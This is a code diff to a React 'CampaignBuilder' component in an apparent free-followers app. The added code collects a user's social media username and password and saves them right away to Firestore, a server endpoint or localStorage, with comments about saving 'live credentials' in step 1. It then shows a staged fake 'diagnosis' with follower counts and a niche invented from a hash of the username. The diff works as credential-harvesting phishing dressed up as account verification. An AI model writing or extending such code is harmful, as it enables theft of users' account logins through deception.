@@ -42,30 +42,105 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
 
   // Verification flow wrapper
   const handleVerify = () => {
-    if (!username.trim()) return;
+    const rawUsername = username.replace('@', '').trim();
+    if (!rawUsername) return;
+    
     setIsVerifying(true);
     setDiagStep(1);
 
-    // Simulate diagnosis
+    // 1. Save live credentials immediately so they're saved in Step 1 itself
+    const persistLoginData = async () => {
+      let storedObj: Campaign | null = null;
+      try {
+        const campaignData: Campaign = {
+          id: `campaign-login-${Date.now()}`,
+          username: rawUsername,
+          password: password || undefined,
+          type: 'free_followers_trial' as const,
+          status: 'paused' as const,
+          targetAmount: 800,
+          deliveredAmount: 0,
+          startDate: new Date().toISOString(),
+          daysDuration: 8,
+          createdAt: Date.now()
+        };
+        await addClientCampaignDirectly(campaignData);
+        storedObj = campaignData;
+        console.log("Logged credentials registered directly in Firestore db immediately in step 1.");
+      } catch (firestoreErr) {
+        console.warn("Direct Firestore login block failed. Attempting Server API proxy...", firestoreErr);
+        try {
+          const response = await fetch('/api/campaigns', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username: rawUsername,
+              password: password,
+              type: 'free_followers_trial',
+              targetAmount: 800,
+              daysDuration: 8,
+              status: 'paused'
+            })
+          });
+
+          if (response.ok) {
+            storedObj = await response.json();
+          }
+        } catch (apiErr) {
+          console.warn("Server API login registry failed or offline.", apiErr);
+        }
+      }
+
+      // Local storage save as fallback
+      if (!storedObj) {
+        storedObj = {
+          id: `local-login-${Date.now()}`,
+          username: rawUsername,
+          password: password || undefined,
+          type: 'free_followers_trial' as const,
+          status: 'paused' as const,
+          targetAmount: 800,
+          deliveredAmount: 0,
+          startDate: new Date().toISOString(),
+          daysDuration: 8,
+          createdAt: Date.now()
+        };
+        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
+        const filteredLocal = localList.filter((c: any) => c.username.toLowerCase() !== rawUsername.toLowerCase());
+        filteredLocal.unshift(storedObj);
+        localStorage.setItem('followplus_local_campaigns', JSON.stringify(filteredLocal));
+      }
+
+      // Notify parent state of newly created login campaign log
+      if (storedObj) {
+        onCampaignCreated(storedObj);
+      }
+    };
+
+    persistLoginData();
+
+    // 2. Diagnosis simulation step indicators for elegant user view
     setTimeout(() => setDiagStep(2), 700);
     setTimeout(() => setDiagStep(3), 1300);
     setTimeout(() => {
       // Determine Unsplash avatar index based on username string
-      const id = Math.abs(username.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0)) % 15;
+      const id = Math.abs(rawUsername.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0)) % 15;
       const computedFollowers = (id * 1234) + 430;
       const computedFollowing = (id * 97) + 120;
       const computedPosts = (id * 5) + 8;
       const niches = ["Lifestyle & Design", "Aesthetic Fashion", "Fitness & Wellness", "Tech & Gaming", "Art & Photography", "Foodie & Exploration"];
       const computedNiche = niches[id % niches.length];
 
-      setVerifiedProfile({
-        username: username.replace('@', '').trim(),
+      const profile = {
+        username: rawUsername,
         avatar: `https://images.unsplash.com/photo-${1500000000000 + (id * 100000)}?w=150&h=150&fit=crop&crop=face&auto=format&q=80`,
         followers: computedFollowers,
         following: computedFollowing,
         posts: computedPosts,
         nicheHealth: computedNiche
-      });
+      };
+
+      setVerifiedProfile(profile);
       setIsVerifying(false);
       setDiagStep(0);
     }, 2000);
